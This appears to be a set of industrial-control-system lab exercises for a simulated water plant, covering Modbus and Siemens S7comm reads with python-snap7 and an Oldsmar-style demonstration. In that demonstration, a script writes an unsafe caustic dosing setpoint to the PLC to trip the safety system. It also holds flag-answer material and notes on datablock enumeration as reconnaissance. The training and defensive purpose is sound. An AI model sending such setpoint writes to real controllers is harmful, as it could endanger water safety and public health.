4. How would the assessment change if the plant had a Modbus-aware IDS instead of an in-PLC tripwire?

Reveal answer

A Modbus-aware IDS would catch writes in real time and alert on source IP, function code, and address. That is strictly better than the in-PLC tripwire because it identifies the offender, records the payload, and fires even when the PLC does not report dirty state. The in-PLC tripwire is a complementary control: it works even when the IDS is offline or misconfigured, and it can be read directly by operators without a SIEM. Defense in depth means both exist.

docs.title: Defensive Recommendations to Masa
docs.text: Finding Risk Mitigation No real-time alert when any client writes to plc1 during a declared read-only window Medium Pair the in-PLC dirty tracker with a Modbus-aware IDS rule (from Exercise 3.4) that fires on any write from a non-HMI source Read-only assessment windows are not coordinated on a shared calendar Medium Add read-only windows to the plant maintenance calendar and require ticketed sign-off before the window opens Dirty state on plc1 is sticky until restart Low Add an operator-only "clear dirty" button on the HMI that pages the shift supervisor before clearing No automated audit of shell history after a read-only assessment Low Require engineers to submit their shell history file as part of the assessment writeup

docs.title: Key Takeaways
docs.text:
• Read-only discipline is a muscle, not a rule. If your shell history contains any write function code against plc1 during a declared read-only window, you failed the exercise, full stop. mbpoll -t 4 with no trailing value is the read form, and Wireshark filtered to modbus is how you prove only Function Code 3 left your host
  • The clean-mode tracker is a simple pattern that any plant can deploy: subclass the Modbus slave context, flip a flag on dangerous function codes, and surface the flag through a reserved register block
  • Internal simulator state updates must bypass the slave context (direct datablock writes) so they do not trip the tracker. Real plants would implement the same distinction between "PLC updates its own state" and "a client writes over the wire"
  • Cross-referencing PLC reads against the HMI is the fastest way to confirm you and the plant agree on reality. Always do it
  • Dirty state is sticky. If you lose the clean run, relaunch the exercise from the OCR platform and start over

docs.title: Why this matters
docs.text:
Speaking a new ICS protocol on the wire is a skill, not a library call. The first time you connect to a Siemens S7 PLC you will meet concepts that have no Modbus equivalent: PDUs, racks and slots, datablocks, and the TPKT/COTP transport stack that wraps every S7 message. Reyna does not care whether you read the right number on the first try. Reyna cares that the next time you touch Plant 2, you know what rack, slot, and db_read mean and you can explain to the plant engineer why the connection succeeded or failed. Exercise 4.1 exists to build that muscle.

The commissioning certificate in DB10 is a deliberately safe read. The Masa Foods Plant 2 engineering team plants an ASCII certificate in DB10 on every commissioned PLC so that operations staff can confirm the controller identity without opening TIA Portal. Your job is to read 32 bytes from DB10 starting at offset 0 and decode them as ASCII. The decoded value is the flag.

Operator HMI access is listed for reference only. Exercise 4.1 touches the PLC directly over S7comm and does not log in anywhere.

docs.title: Background: What S7comm Is
docs.text:
S7comm is the proprietary protocol Siemens uses for all of its S7-300, S7-400, and S7-1200/1500 controllers. On the wire it is layered on top of two older standards:

Layer Purpose TCP/102 Transport TPKT (RFC 1006) Packetizes ISO messages over TCP COTP Connection-Oriented Transport Protocol (ISO 8073 class 0) S7comm Application layer (function codes, item addressing, datablocks)

The TPKT and COTP layers come from the OSI era and are why every S7 connection starts with a short handshake. python-snap7 handles both layers for you, so the only call you need is Client.connect(address, rack, slot, tcpport=102).

docs.title: Rack and slot
docs.text: Siemens addresses a PLC by rack and slot. For S7-1200 controllers, the CPU sits at rack 0, slot 1. That is the combination every Exercise 4.x uses. Older S7-300 controllers sometimes live at rack 0, slot 2, but you will not meet one in this track.

docs.title: Datablocks (DBs)
docs.text: Where Modbus has "holding registers", S7comm has "datablocks". A datablock is a named region of memory inside the PLC that you address by number. DB1 is process data. DB10 is a commissioning certificate. DB100 is the device identification string. The Plant 2 PLC uses DB999 for an incident marker and DB200 for an assessment flag. You address a datablock read as db_read(db_number, offset, length).

docs.title: Tools You Will Need
docs.text: Tool Purpose python-snap7 S7comm client library libsnap7-1 Debian package Native library that python-snap7 wraps Wireshark Optional packet capture if you want to see the handshake

docs.title: Stage 1: Verify the Stack
docs.text:
Kali

python3 -c "from snap7.client import Client; print('snap7 ok')"
getent hosts plc-water.masa.local
nc -zv plc-water.masa.local 102

All three must succeed before you continue.

docs.title: Stage 2: Connect and Read DB10
docs.text:
Open a Python script that builds an S7 connection step by step. The pattern is:

  1. Create a Client() object (the snap7 session handle).
  2. Call connect(host, rack, slot, tcpport=102). For S7-1200 CPUs, rack is always 0 and slot is always 1.
  3. Call db_read(db_number, start_offset, length) to pull raw bytes from a datablock.
  4. Wrap the result in bytes() because db_read returns a bytearray that does not support .decode() directly.
  5. Strip trailing null bytes with .rstrip(b"\x00") because Siemens datablocks are null-padded to their declared size.
  6. Decode the remaining bytes as ASCII.

Kali

python3 - <<'PYEOF'
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
raw = bytes(c.db_read(10, 0, 32))
text = raw.rstrip(b"\x00").decode("ascii")
print("DB10:", repr(text))
c.disconnect()
c.destroy()
PYEOF
Expected output 
DB10: 'OCR{...}'

The six-step pattern (create, connect, db_read, bytes, rstrip, decode) is the S7comm equivalent of the Modbus read_holding_registers workflow you used on Plant 1. Every Exercise 4.x reuses it. Commit the sequence to memory now.

Decode and submit in the OCR platform.

docs.title: Stage 3: Spot the Device ID
docs.text:
DB100 holds the device identification string. The first 32 bytes are the vendor line, and the next 32 bytes are the order code. Read all 64 bytes, then slice the buffer into two halves and decode each one separately. The slicing is necessary because the null-padding between the two fields would otherwise appear as garbage in the middle of a single decoded string.

Kali

python3 - <<'PYEOF'
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
raw = bytes(c.db_read(100, 0, 64))
vendor = raw[0:32].rstrip(b"\x00").decode("ascii")
order = raw[32:64].rstrip(b"\x00").decode("ascii")
print("vendor:", vendor)
print("order: ", order)
c.disconnect()
c.destroy()
PYEOF

docs.title: Output Interpretation
docs.text:
• A successful connect() call returns with no exception. If you get Snap7Exception, check that rack=0, slot=1 and that TCP/102 is reachable
  • db_read returns a bytearray that must be wrapped in bytes() before you slice or decode it
  • The certificate block is null-padded to 32 bytes. Strip trailing null bytes before decoding
  • A device ID that does not start with Siemens means you are talking to the wrong host. Disconnect and verify the target IP

docs.title: Analysis Questions
docs.text:
1. Why does S7comm require rack and slot numbers where Modbus does not?

Reveal answer

Siemens S7 hardware is modular. A real plant rack holds a power supply, a CPU card, and optional communication processors, each in a numbered slot. The rack and slot numbers let a client address the correct CPU card when a rack holds more than one. Modbus has no concept of hardware modularity at the protocol layer, so it does not need an equivalent.

2. What happens if you pass tcpport=102 without the keyword argument?

Reveal answer

python-snap7's connect() takes positional args (address, rack, slot) only. Passing a fourth positional argument raises TypeError. You must always use the tcpport= keyword. The keyword requirement catches most students on their first S7 connection because the Modbus equivalent is positional.

3. DB10 in the Plant 2 simulator is a plain ASCII string. Is that how a real PLC would store commissioning data?

Reveal answer

Real Siemens projects store commissioning metadata as structured datatypes (STRUCTs with typed fields for plant code, commissioning date, firmware hash, and so on), not as freeform ASCII. The simulator uses flat ASCII because it is the cleanest way to teach db_read and .decode('ascii') without also teaching S7 structured data. Treat the ASCII certificate pattern as a teaching aid, not a production model.

4. Wireshark shows a TPKT and COTP layer on every S7comm packet. Could a Modbus IDS signature catch an S7 write attempt?

Reveal answer

No. Modbus signatures look for the Modbus function code byte at a fixed offset in a TCP payload that has no TPKT or COTP header. S7comm payloads have those headers, so a Modbus signature will not match. Protecting Plant 2 requires an S7-aware IDS ruleset, and the two plants cannot share a single detection signature set.

docs.title: Key Takeaways
docs.text:
• S7comm rides on TPKT and COTP over TCP/102. python-snap7 hides that plumbing, but you should still know it is there
  • Siemens S7-1200 CPUs always live at rack 0, slot 1. S7-300 controllers sometimes use slot 2
  • Datablocks are the S7 equivalent of Modbus holding registers, addressed by number and offset
  • Modbus and S7comm do not share an IDS signature. Plant 2 needs its own detection ruleset
  • Strip trailing null bytes before decoding ASCII datablock reads, or your decoded string will carry garbage

docs.text: Plant 2 runs a daily water quality review at 06:00 local. The review reads pH, chlorine residual, turbidity, and treated-line flow from the water PLC and writes the numbers into an operations log. The outgoing Plant 2 engineer left the job on a scribbled sticky note and nobody else has walked through it. Reyna Alvarado wants the process documented and automated so the morning shift stops guessing at DB offsets.

docs.title: Why this matters
docs.text:
Water quality readings are the bread and butter of a treatment plant engineer's day. Being able to pull the four core values (pH, chlorine, turbidity, flow) from a PLC without asking operations is table stakes for any OT work on a water utility. Reyna also wants this exercise in your history because the first time Plant 2 has a real incident, she will hand you the console and say "give me the quality snapshot right now", and you will not have time to hunt through DB offsets. Exercise 4.2 is where you build the habit of knowing the four offsets by heart.

The Plant 2 PLC maintains a "snapshot" datablock at DB800 that the engineer updates every morning at 06:00 by hand via TIA Portal. The snapshot is a flat uint16 array big-endian:

Offset Field Scaling Example raw Example engineering 0-1 pH value / 100 720 7.20 2-3 chlorine value / 100 (ppm) 120 1.20 ppm 4-5 turbidity value / 100 (NTU) 85 0.85 NTU 6-7 flow value / 1 (gpm) 240 240 gpm

Your job is to read 8 bytes from DB800 offset 0, unpack as four big-endian uint16, and submit the flag, which is the four raw values joined into a string.

Flip the cockpit into its Engineering view and every gauge is labelled with the live PLC address behind it, so the water quality readings map to their exact DB offsets right off the HMI. The register map you are about to read by hand sits one click away on the operator console.

The Engineering X-ray binds each live quality value to its underlying S7 datablock address and exposes the full DB1 process image as a register map, the same kind of offset-to-tag binding you walk by hand against DB800.

docs.title: Background: struct.unpack on Siemens Values
docs.text:
Siemens PLCs store all multi-byte integers on the wire in big-endian order, regardless of the host CPU's native byte order. Big-endian is the opposite of most Modbus implementations, where the order is vendor-specific. For S7comm the rule is simple: always use the big-endian format character in struct.unpack, which is >.

A four-value snapshot read looks like:

raw = bytes(c.db_read(800, 0, 8))
pH, cl, turb, flow = struct.unpack(">HHHH", raw)

H is unsigned 16-bit, which matches DB800's signed-to-unsigned convention (pH, chlorine, and turbidity are never negative in normal plant operation). If you use little-endian < by mistake, your pH will read as something absurd like 207.36, which is a useful failure mode to recognize.

docs.title: Tools You Will Need
docs.text: Tool Purpose python-snap7 S7comm client struct (Python stdlib) Unpack the DB800 bytes

docs.title: Stage 1: Read the Snapshot Block
docs.text:
DB800 contains four uint16 values packed consecutively. Each is 2 bytes, so 4 values = 8 bytes total. Read all 8 bytes with db_read(800, 0, 8) and use Python's struct.unpack to split them into four integers.

The format string ">HHHH" breaks down as:

  • > means big-endian byte order (required for all Siemens values on the wire)
  • H means unsigned 16-bit integer (2 bytes)
  • Four H characters decode four consecutive uint16 values from the 8-byte buffer

The tuple assignment pH, cl, turb, flow = struct.unpack(...) maps each decoded integer to a named variable in the same order they sit in the datablock (offset 0, 2, 4, 6).

Kali

python3 - <<'PYEOF'
import struct
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
raw = bytes(c.db_read(800, 0, 8))
print("raw hex:", raw.hex())
pH, cl, turb, flow = struct.unpack(">HHHH", raw)
print(f"raw: pH={pH} cl={cl} turb={turb} flow={flow}")
print(f"eng: pH {pH/100:.2f}  cl {cl/100:.2f} ppm  turb {turb/100:.2f} NTU  flow {flow} gpm")
c.disconnect()
c.destroy()
PYEOF
Expected output (values are fixed in this simulator build) 
raw hex: 02e2008e005b00ee
raw: pH=738 cl=142 turb=91 flow=238
eng: pH 7.38  cl 1.42 ppm  turb 0.91 NTU  flow 238 gpm

docs.title: Stage 2: Format and Submit the Flag
docs.text:
The flag is the four raw values in this format:

OCR{pH<raw>_cl<raw>_turb<raw>_flow<raw>}

Assemble the flag in Python to avoid shell quoting issues:

Kali

python3 -c "
import struct
from snap7.client import Client
c = Client()
c.connect('plc-water.masa.local', 0, 1, tcpport=102)
pH, cl, t, f = struct.unpack('>HHHH', bytes(c.db_read(800, 0, 8)))
print(f'OCR{{pH{pH}_cl{cl}_turb{t}_flow{f}}}')
c.disconnect(); c.destroy()"

Copy the output into the OCR platform.

The same Plant 2 cell whose quality values you just read can also be pushed into an unsafe state by a write to the dosing setpoint, which is what Exercise 4.3 demonstrates against this exact cockpit. Knowing what the screen looks like when it goes wrong is part of reading it well.

What an unsafe write looks like on the same screen: a setpoint pushed past the dosing safety limit trips the plant, the dosing pump isolates, the safety banner fires, and the cockpit drops to alarm. The quality values you read here are the same ones an operator would watch collapse during an incident.

docs.title: Output Interpretation
docs.text:
• A pH raw value of 720 decodes to 7.20, which is the Masa Foods target pH. Values between 680 and 760 are normal
  • A chlorine raw value of 120 decodes to 1.20 ppm, which is within the EPA drinking-water range of 0.2 to 4.0 ppm. Higher values suggest the chlorine dosing pump is running above target
  • Flow is stored in gallons per minute directly (no scaling). A flow reading below 100 gpm means the raw water intake is throttled or the treated tank is full
  • If your struct unpack returns values over 10000, you are probably using little-endian. Switch to >HHHH

docs.title: Analysis Questions
docs.text:
1. Why does DB800 use raw uint16 with explicit scaling instead of storing IEEE 754 floats?

Reveal answer

S7-1200 controllers support REAL (32-bit IEEE 754) natively, but many older Siemens projects store scaled integers for three reasons: (1) integers halve the datablock size, which matters on small controllers, (2) integer math is deterministic and avoids rounding surprises on the PLC side, and (3) legacy HMI platforms often expect integer tag sources. The tradeoff is that the scaling convention has to be documented separately. If the engineer who wrote the scaling leaves without documenting it, an incoming engineer has to guess, which is exactly the scenario Exercise 4.2 is trying to prevent.

2. The flag format uses the raw values, not the engineering values. Why?

Reveal answer

Raw values are exact. Engineering values involve division and rounding, and even small float formatting differences (7.20 vs 7.2 vs 7.200) would produce a different flag string. Pinning the flag to raw uint16 values eliminates the formatting question entirely and forces the student to read the register in its native form.

3. What happens if you call db_read(800, 0, 8) against a real Siemens S7-1200 without a DB800 defined in the project?

Reveal answer

The PLC returns an S7 error code indicating "Item not available". python-snap7 raises a Snap7Exception with a "Address out of range" message. In production, an attacker scanning a PLC for datablocks would see Snap7Exception on most DB numbers and a successful read on the ones the project actually defines. That makes datablock enumeration a passive reconnaissance primitive against S7 controllers, and it is why Siemens protection level 3 hides even the existence of undefined DBs behind authentication.

4. If Plant 2 replaced the DB800 snapshot pattern with a morning curl to an HTTP endpoint on the PLC, would that be a net security improvement?

Reveal answer

No. Adding an HTTP endpoint on a PLC multiplies the attack surface (web stack, parser, authentication layer) without removing the underlying S7 exposure. The snapshot pattern is fine; what is missing is protection level 2 on TCP/102 and firewall rules that restrict who can reach the PLC in the first place. Always fix the transport, not the application.

docs.text: Finding Risk Mitigation DB800 is readable by any host on the OT LAN Medium Move Plant 2 PLCs behind a protection level 3 configuration and firewall TCP/102 to the engineering workstation VLAN DB800 scaling convention is undocumented outside the outgoing engineer's head Low Add the scaling table to the Plant 2 commissioning document and version it in the engineering SharePoint The morning quality review is a manual ritual with no audit trail Low Replace the manual review with a scheduled script that writes the snapshot to the historian with a timestamp

docs.title: Key Takeaways
docs.text:
• Siemens values on the wire are always big-endian. Always use struct.unpack('>...')
  • Raw values with explicit scaling are a valid PLC design pattern, but the scaling table must be documented outside the PLC
  • Datablock enumeration on unprotected S7 controllers is a useful reconnaissance primitive. Defense is protection level 3, not obscurity
  • Exercise 4.2 is the template for every future "pull four values from a PLC" task. Commit the pattern to muscle memory

docs.title: Scenario
docs.text:
In February 2021 an attacker with remote access to the Oldsmar, Florida water treatment plant raised the sodium hydroxide dosing setpoint from 100 ppm to 11,100 ppm. The plant operator caught the change on the HMI in seconds and reverted it before any water left the facility. The incident became the textbook example of how a single unauthenticated write on an OT protocol can move a plant toward an unsafe state within a normal maintenance window.

Reyna Alvarado has signed off on a controlled demonstration during a Plant 2 maintenance window. Executive leadership needs to see, in concrete terms, that the Masa Plant 2 PLC has the same exposure the Oldsmar plant had. Nothing physical will actually dose, and no real water will leave Plant 2. The PLC is running under a simulator harness with a process model and an independent safety PLC that trips when the caustic dosing setpoint exceeds 120 ml/min for more than 3 seconds.

docs.title: Why this matters
docs.text:
Executives read about Oldsmar in the Wall Street Journal and concluded that "ICS attacks are rare and sophisticated". Reyna wants to break that assumption on camera. Her pitch to the Plant 2 executive review is: the Oldsmar attack was one unauthenticated S7 write, it took ten seconds, and the defender's only safety net was a human operator watching the right screen at the right moment. Exercise 4.3 is the demo she needs. You write the unsafe setpoint, the independent safety PLC trips, and the incident marker in DB999 becomes permanent evidence on the container. Executives then see the two-minute video and approve the protection level 3 rollout that Reyna has been asking for since 2024.

You also need this exercise in your own history because in a real engagement you will be asked whether you can reproduce an incident without actually causing one. The answer depends on the harness you built around the PLC, not on your S7 knowledge. Exercise 4.3 is the template.

docs.title: The Plant 2 simulator harness
docs.text:
The Plant 2 PLC runs under a simulator that enforces three things:

  1. A process model that tracks caustic dosing, pH response, and chlorine residual in real time
  2. An independent safety instrumented system (SIS) that trips the plant to state=2 when the caustic setpoint crosses 120 ml/min for more than 3 seconds
  3. An incident log in DB999 that records the cause code and writes a permanent ASCII marker on the first trip

Your job is to write an unsafe caustic setpoint to DB1 offset 16 on the Plant 2 PLC, wait for the independent safety PLC to trip the plant to alarm state, and read the incident marker from DB999. The incident marker is the flag.

Values Reyna gave you to use:

Parameter Value Caustic tag DB1 offset 16 (uint16, ml/min) Safe baseline 45 ml/min Safety trip threshold 120 ml/min SIS trip window 3 seconds

Reset the setpoint to 45 ml/min after you capture the flag so operations can close the window cleanly.

docs.text:
Plant 2 runs a live operator cockpit for the water treatment line. Open it in a browser at the address shown for ophmi-water in the Exercise Network panel (HTTP, port 80); from the in-lab Kali the name ophmi-water.masa.local also resolves. The cockpit shows the caustic and chlorine dosing rates, the process gauges, and the independent dosing safety system in real time, so you can watch the dose climb and the safety trip fire as you run each stage.

Normal operation: caustic dosing holds the 45 ml/min baseline, the dosing SIS is armed, and pH and chlorine sit in band. The Oldsmar operator was watching a screen like this when the setpoint changed.

Flip the cockpit into its Engineering view and every element is labelled with the live PLC address behind it, so the caustic dosing pump reads DB1.16 straight off the HMI. The same register map you are about to write by hand sits one click away on the operator console.

The Engineering X-ray binds the caustic dosing pump to DB1 offset 16, the exact tag you write in Stage 2, and exposes the full DB1 process image as a live register map.

  • Read the trip cause code from DB999 offset 32
  • Restore the 45 ml/min safe baseline before you close the exercise

docs.title: Background: The Real Oldsmar Attack
docs.text:
Publicly available details of the Oldsmar incident are narrow but consistent. An attacker reached a TeamViewer session on a plant workstation. From there the attacker used the HMI to change the sodium hydroxide setpoint. Oldsmar used a Windows HMI that spoke some OT protocol to the underlying controller; the exact protocol was never publicly disclosed but is widely believed to be S7comm or a vendor-specific overlay.

Three defenses existed at Oldsmar:

  1. The HMI logged the setpoint change visibly on the operator screen
  2. The operator happened to be watching the HMI at that moment
  3. Even if the setpoint had held, process dynamics would not have pushed sodium hydroxide to the finished water tank for several more hours

Of the three, only the first is under the plant's control through configuration. The second depends on human attention. The third depends on plant layout. Exercise 4.3 recreates the first two defenses on a compressed timescale and adds a fourth: the SIS trip.

docs.title: The SIS trip window
docs.text:
A Safety Instrumented System (SIS) is a separate controller whose only job is to watch a small number of critical measurements and force the plant to a safe state if any of them cross a limit. SISes are usually physical (a Siemens Simatic F-CPU in a separate chassis), and the rule of thumb is that the SIS must be independent from the process PLC. The Plant 2 simulator models this with a deterministic trip rule: if the caustic setpoint or caustic actual rate exceeds CAUSTIC_MAX_SAFE_ML_MIN for more than SIS_TRIP_WINDOW_S seconds, the SIS forces plant_state to 2, sets alarm bit 0, and writes the incident marker into DB999.

SIS_TRIP_WINDOW_S is 3.0 seconds in this simulator. The window exists because a real SIS does not trip on every transient spike; it waits for a short debounce to avoid nuisance trips. You will need to sleep at least 5 to 6 seconds after your write to guarantee the trip has fully fired.

docs.title: Tools You Will Need
docs.text: Tool Purpose python-snap7 S7comm client struct Pack the uint16 setpoint value time.sleep Wait out the SIS trip window

docs.title: Stage 1: Capture the Baseline
docs.text:
Kali

python3 - <<'PYEOF'
import struct
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
baseline = struct.unpack(">H", bytes(c.db_read(1, 16, 2)))[0]
print(f"baseline caustic setpoint: {baseline} ml/min")
c.disconnect()
c.destroy()
PYEOF
Expected output 
baseline caustic setpoint: 45 ml/min

docs.title: Stage 2: Write the Unsafe Setpoint
docs.text:
db_write is the mirror of db_read: it takes a DB number, a byte offset, and a packed byte payload. struct.pack(">H", 200) encodes 200 as a big-endian uint16 (two bytes), which is what the PLC expects at DB1 offset 16.

After the write, sleep 6 seconds. The SIS trip window is 3 seconds, so 6 gives the independent safety PLC enough time to detect the overlimit, fire the trip, and update DB999. Sleeping less than 3 seconds will leave DB999 empty because the trip has not fired yet.

After sleeping, verify the trip by reading plant_state at DB1 offset 24 (should be 2, meaning alarm) and alarm_word at DB1 offset 26 (bit 0 set means dosing overlimit).

Kali

python3 - <<'PYEOF'
import struct, time
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
c.db_write(1, 16, struct.pack(">H", 200))
print("wrote 200 ml/min, sleeping 6 s for the SIS trip")
time.sleep(6)
plant_state = struct.unpack(">H", bytes(c.db_read(1, 24, 2)))[0]
alarm = struct.unpack(">H", bytes(c.db_read(1, 26, 2)))[0]
print(f"plant_state after trip: {plant_state}")
print(f"alarm_word after trip:  0x{alarm:04x}")
c.disconnect()
c.destroy()
PYEOF
Expected output after the trip 
wrote 200 ml/min, sleeping 6 s for the SIS trip
plant_state after trip: 2
alarm_word after trip:  0x0001

plant_state=2 is the simulator's alarm state, and alarm_word=0x0001 is the "dosing overlimit" bit.

The moment the SIS trips: the caustic dosing pump is isolated, the safety banner fires, and the cockpit drops to alarm. On a real plant, this is the only screen that would have shown the operator something was wrong before the dose reached the finished water.

docs.title: Stage 3: Read the Incident Marker
docs.text:
DB999 has a two-part layout. The first 32 bytes (offset 0-31) hold an ASCII incident marker string, null-padded. Bytes 32-33 hold a uint16 cause code that identifies what tripped the SIS. Read 34 bytes in one call, then slice the buffer into the two parts:

  • raw[0:32]: the incident marker (strip nulls, decode as ASCII)
  • raw[32:34]: the cause code (unpack as big-endian uint16 with struct.unpack(">H", ...))

Kali

python3 - <<'PYEOF'
import struct
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
raw = bytes(c.db_read(999, 0, 34))
marker = raw[0:32].rstrip(b"\x00").decode("ascii")
cause = struct.unpack(">H", raw[32:34])[0]
print(f"incident marker: {marker}")
print(f"cause code:      {cause}")
c.disconnect()
c.destroy()
PYEOF

Cause code 1 = caustic overlimit, 2 = chlorine overlimit.

docs.title: Stage 4: Restore and Close
docs.text:
Write the safe baseline (45 ml/min) back to DB1 offset 16. Even though the SIS trip state does not clear on restore (the container must be restarted for that), restoring the setpoint is a professional habit: you should never leave a PLC with an unsafe value, even inside a simulator.

Kali

python3 - <<'PYEOF'
import struct
from snap7.client import Client
c = Client()
c.connect("plc-water.masa.local", 0, 1, tcpport=102)
c.db_write(1, 16, struct.pack(">H", 45))
print("restored caustic setpoint to 45 ml/min")
c.disconnect()
c.destroy()
PYEOF

The SIS trip state does not clear on restore; the simulator container has to be restarted for the plant to leave alarm state. That is intentional and matches how real SIS trips behave: a human has to acknowledge the alarm and the field conditions before the plant can run again.

docs.title: Output Interpretation
docs.text:
• The baseline read should always return 45. Anything else means the container was not fresh or another student touched it
  • A successful write returns with no exception. python-snap7 does not raise on a successful write; it raises only on transport or protocol errors
  • plant_state is at DB1 offset 24 and is 1 in normal running and 2 in alarm. After the trip it will stay 2 until the container is restarted
  • The incident marker is 32 bytes null-padded. Strip nulls before decoding
  • If you read DB999 less than 3 seconds after your write, the marker will still be null bytes because the SIS trip window has not expired. Sleep at least 5 seconds

docs.title: Analysis Questions
docs.text:
1. Why does the simulator wait 3 seconds before tripping instead of tripping on the first overlimit tick?

Reveal answer

Real SIS controllers always include a debounce window to avoid nuisance trips from transient measurement noise. A typical window is 1 to 5 seconds, chosen to be long enough to filter noise but short enough that a genuine fault is caught before damage. The 3-second window in this simulator is a conservative midpoint. Removing the window would make the SIS fire on every small measurement spike and shut the plant down multiple times per day, which operations would quickly route around.

2. The real Oldsmar operator reverted the setpoint in seconds. Would a fast revert have prevented the simulator SIS from tripping?

Reveal answer

Yes, if the revert happened within 3 seconds. The simulator watches the caustic actual rate, which lags the setpoint through the pump dynamics. A setpoint that spikes to 200 and back to 45 within 1 second would cause a brief overlimit on the actual rate but would drop below 120 before the 3-second window expires. The fast-revert behavior matches the Oldsmar real-world outcome where a quick human revert prevented the incident, and it is exactly why operator HMI attention is the textbook example of a procedural control: it only works if the operator is watching at the right moment.

3. If you wrote 119 ml/min (just below the trip threshold) and held it for 10 minutes, would the SIS trip?

Reveal answer

No. The SIS trip condition is a threshold comparison, not an integral. A sustained dose at 119 ml/min is inside the "safe" band the way the simulator defines safe. In real plants, this is a known limitation of threshold-based SIS logic: a skilled attacker can stay just below the threshold and cause cumulative damage the SIS cannot see. Defense requires adding an integral-of-exposure rule on top of the threshold, which is Exercise 4.4 territory.

4. Why does the incident marker in DB999 persist even after you restore the setpoint?

Reveal answer

Incident markers are forensic evidence. A PLC that clears them on resumption would lose the only in-band record that anything ever happened. Real Siemens F-CPUs behave the same way: the fault state latches until an authorized operator acknowledges it via a configured input, not automatically on setpoint recovery. The simulator's "restart the container to clear" pattern models the "human acknowledges before plant resumes" workflow.

docs.text:

  • Restoring the setpoint after the incident marker is written is still the right professional habit, even though the SIS trip does not clear. Leaving the PLC with 200 ml/min on the caustic pump makes the container unsafe for anyone who touches it after you

docs.title: Scenario
docs.text:
Plant 2 operations has been seeing odd chlorine residual readings at the discharge sample point for three days. Nothing on the HMI looks alarming in any single screenshot, and the historian alarm band was never breached. Reyna Alvarado's hunch is that someone with S7 access is moving the chlorine setpoint upward a hundredth of a ppm at a time, staying comfortably below the alarm threshold while the dose rate climbs.

You have been asked to recreate the attack pattern against a simulator copy of the Plant 2 PLC. The simulator is pre-seeded with the drift behavior so you can practice the detection workflow Reyna wants to run against live Plant 2 next week.

docs.title: Why this matters
docs.text:
Threshold alarms are the default in almost every OT deployment because they are simple to configure and easy for operators to understand. An attacker who knows the threshold is at X and moves the setpoint toward X - epsilon can run indefinitely without ever firing an alarm, and the plant takes the cumulative exposure. Reyna has been fighting for a historian-based trend alarm on top of the threshold alarms since 2024 because she knows this is the gap. Exercise 4.4 is the worked example she will use in the capital request to budget the historian upgrade. Your report from this exercise becomes her evidence.

You also build a professional habit that generalizes to every OT engagement: take two reads with a short delay between them and diff the values. Any register whose value changes outside the expected noise band is a candidate for investigation. The diff approach finds drift attacks, stuck sensors, rogue write loops, and a dozen other common faults that a single point-in-time read cannot catch.

docs.title: The simulator drift rate
docs.text:
The production drift in Reyna's hunch is roughly 0.1 ppm per day. The simulator runs at a compressed timescale of approximately 3 ppm per minute so you can see the effect within a single lab session. Everything else is the same: the chlorine setpoint at DB1 offset 6 moves upward on its own, and the PLC does not raise any alarm because the setpoint stays inside the nominal 0 to 5 ppm band.

The PLC rewards your corrective write only after the drift has accumulated beyond 1.50 ppm (raw value 150). A cold correction from 1.20 to 1.20 before the drift has had time to climb will leave DB400 stuck on DRIFT_NOT_CORRECTED. That is deliberate: Reyna wants you to prove you observed the drift before you correct it.

docs.title: The operator cockpit
docs.text:
Plant 2 runs a live operator cockpit for the water treatment line, and the whole point of this exercise is that a slow drift hides on it in plain sight. Open it in a browser at the address shown for ophmi-water in the Exercise Network panel (HTTP, port 80); from the in-lab Kali the name ophmi-water.masa.local also resolves. The cockpit shows the dosing rates, the process gauges, and the chlorine residual in real time. An operator glancing at any single screenshot sees every value comfortably inside its band, which is exactly why a setpoint creeping up a hundredth of a ppm at a time never catches the eye. The signal only appears when you compare two reads over time, not in any one frame.

What the operator watches: every gauge sits in band and nothing looks alarming. A slow drift on the chlorine setpoint hides here in plain sight, because no single frame ever leaves the nominal range. Catching it takes two reads and a diff, not a glance.

Flip the cockpit into its Engineering view and every element is labelled with the live PLC address behind it, so the chlorine setpoint reads DB1.6 straight off the HMI, the exact register you are about to diff between two reads.

The Engineering X-ray binds the chlorine setpoint to DB1 offset 6, the drifting tag in this exercise, and exposes the full DB1 process image as a live register map: the same register you read twice and diff to expose the drift.
